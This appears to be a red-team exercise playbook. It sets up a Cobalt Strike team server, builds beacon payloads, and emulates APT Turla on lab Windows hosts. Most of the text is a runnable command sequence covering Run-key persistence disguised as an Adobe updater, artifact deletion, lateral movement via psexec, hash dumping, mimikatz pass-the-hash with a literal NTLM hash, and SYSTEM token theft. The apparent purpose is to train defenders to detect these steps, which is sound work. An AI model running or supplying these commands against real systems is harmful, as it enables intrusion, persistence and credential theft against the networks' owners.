# **Setting up Cobaltstrike**

* Be root for the setup process.
```md
> sudo su
```
## Start Python3 http.server.
```md
> mkdir Downloads/beacons
> cd Downloads/beacons
> python3 -m http.server 8000
```
>***Note: This will be where your payloads are hosted. Or you could just host them through your cobalt strike instance which is simple. Figure it out yourself.***
## Start a team server
   *  (must be root / Sudo su) 

```md
> cd /usr/bin/cobaltstrike
> ip -br a
> ./teamserver <Ip_address> <password> 
# In a new tab, run the following commands to connect to the team server:
> cd /usr/bin/cobaltstrike
> ./cobaltstrike
# A prompt will appear
```
* Enter the `<eth1_ip_address>` of the teamserver and `password` in the appropriate boxes.

*The User field can be changed to the name of the kali box, but it is unnecessary.*
* Click `Connect` then click Yes.

## Configure listeners

* Select the `Listeners` tab within the Cobalt Strike GUI. 
* Select `Add` at the bottom of the tab. A prompt will appear with the following options: 
  * Name: Enter the type of listener you are setting up. (HTTP)
  * Payload: Select the payload (.exe)
  * Hosts: Add hosts by clicking on the plus sign. A small prompt will appear.
  * Host(Stager): Type the domain set in your DNS server.
  * Profile: Default
  * Click Save


>***Note: SMB does not have these options.  Accept the defaults.***
## Build the payloads
* Select `Attacks` on the Menu Bar and then select `Packages`.
* Select the appropriate beacon type based on the table above.
* Select the "..." button next to “listener” and select the listener based on the table.
* Select the output based on the table above.
* Click on Generate
* Save the executable to the /root/Downloads/beacons directory using `"TwoFace.exe"`
  * Repeat the above steps and name the next payload `"Mosquito.exe"`

>***Note: Check the box x64: Use x64 payload (Since we know we are on windows 10 machines and x64 will be less prone to breaking)*** 


# **APT Turla**
***This APT is known to use Cobalt Strike***
* Browse to, Save, and Run TwoFace.exe on BLDG1-2-WS11 under user judah.clark (Domain Admin).
  * Once the beacon calls back interact with it and enter the following commands at an interval of your choice.

## Inside of the Initial beacon (Twoface.exe) 

```md
> cd C:\Windows\System32
> upload Mosquito.exe 
> powerpick reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ /v "AdobeUpdater" /t REG_SZ /d C:\Users\judah.clark\Documents\Mosquito.exe
> powerpick start-process -file Mosquito.exe 
> powerpick stop-process -name TwoFace
> ps
```
>***Note: We Set persistence with a new payload that was uploaded through our initial access and then stopped our first beacon***

## Inside of the new beacon (Mosquito.exe)
```md
> powerpick Remove-Item 'C:\Users\judah.clark\Documents\TwoFace.exe'
> jump psexec64 BLDG1-1-WS13 SMB
> jump psexec64 BLDG1-1-WS12 SMB
```
>***Note: Removed the artifact "TwoFace.exe" and moved laterally via jump***
## Inside of the SMB Beacon on WS13
```md
> powerpick tasklist /v
> hashdump
  * use the output of the hashdump for mimikatz
> mimikatz sekurlsa::pth /user:Administrator /domain:./ntlm:dade81da118816138bfa7b4779a80f88 /run:"powershell -w hidden"
> steal_token 2836
```
>***Note: Look at the tasklist to determine which process you will steal the token for. Look for SYSTEM and Impersonate it with steal_token \<PID>***
## Inside of the SMB Beacon on WS12
```md
> sleep 500
```
>***Note: Leave this beacon alone and see if the team can recognize what it is.***